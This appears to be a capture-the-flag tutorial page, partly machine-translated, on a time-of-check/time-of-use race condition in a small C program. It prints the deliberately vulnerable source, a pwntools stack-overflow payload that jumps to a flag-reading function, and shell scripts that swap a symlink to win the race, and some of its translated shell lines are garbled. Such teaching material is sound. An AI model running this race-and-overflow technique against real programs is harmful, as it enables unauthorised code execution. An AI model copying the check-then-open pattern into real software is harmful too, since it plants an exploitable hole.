[EN](./problem.md) | [ZH](./problem-zh.md)
#题


## Construction example


### Source code


The source code is as follows


```c

#include <fcntl.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <sys/stat.h>

#include <unistd.h>

void showflag() { system("cat flag"); }

void vuln(char *file, char *buf) {

  int number;

  int index = 0;

  int fd = open(file, O_RDONLY);

  if (fd == -1) {

    perror("open file failed!!");

    return;

  }

  while (1) {

    number = read(fd, buf + index, 128);

    if (number <= 0) {

      break;

    }

    index += number;

  }

  buf[index + 1] = '\x00';

}

void check(char *file) {

  struct stat tmp;

  if (strcmp(file, "flag") == 0) {

    puts("file can not be flag!!");

    exit(0);

  }

  stat(file, &tmp);

  if (tmp.st_size > 255) {

    puts("file size is too large!!");

    exit(0);

  }

}

int main(int argc, char *argv[argc]) {

  char buf[256];

  if (argc == 2) {

    check(argv[1]);

    vuln(argv[1], buf);

  } else {

    puts("Usage ./prog <filename>");

  }

  return 0;

}

```



### Analysis


It can be seen that the basic flow of the program is as follows


- Check if the incoming command line argument is &quot;flag&quot; and if so, exit.
- Check if the file size corresponding to the incoming command line parameter is greater than 255. If so, exit directly.
- Read the contents of the file corresponding to the command line parameters into buf. The size of buf is 256.


It seems that we checked the size of the file, and the size of the buf can also meet the corresponding maximum size, but there is a problem of conditional competition.


If we delete the corresponding file after the program has checked the corresponding file size and symbolically link to another larger file, the program will read more content, which will cause stack overflow.


### The basic idea


Well, the basic idea is coming, we want to get the corresponding `flag` content. Then we only need to modify the return address of the corresponding `main` function through stack overflow. The address of `showflag` can be obtained through disassembly and debugging, and the corresponding payload is obtained.


```python

➜ race test cat payload.py
from pwn import *

test = ELF (&#39;./ test&#39;)
payload = 'a' * 0x100 + 'b' * 8 + p64(test.symbols['showflag'])

open('big', 'w').write(payload)

```



The script that competes for the two conditions is


```sh

Exp racing test cat exp.sh
#! / Bin / sh
for i in `seq 500`

do

    cp small fake

    sleep 0.000008

    rm fake

    ln -s big fake

    rm fake

done

Run race test cat run.sh
#! / Bin / sh
for i in `seq 1000`

do

    ./test fake

done

```



Where exp is used to compete to delete the fake file in the corresponding window while performing symbolic links. Run is used to execute the program.


### Specific effects


```shell

➜ race test (sh exp.sh &amp;) &amp;&amp; sh run.sh
[...]

file size is too large!!

open file failed!!: No such file or directory

open file failed!!: No such file or directory

open file failed!!: No such file or directory

open file failed!!: No such file or directory

file size is too large!!

open file failed!!: No such file or directory

open file failed!!: No such file or directory

flag{race_condition_succeed!}

[...]

```



The key to success is the timing of the corresponding `sleep`.


# 参考


- http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html

- http://www.cnblogs.com/huxiao-tee/p/4660352.html
- https://github.com/dirtycow/dirtycow.github.io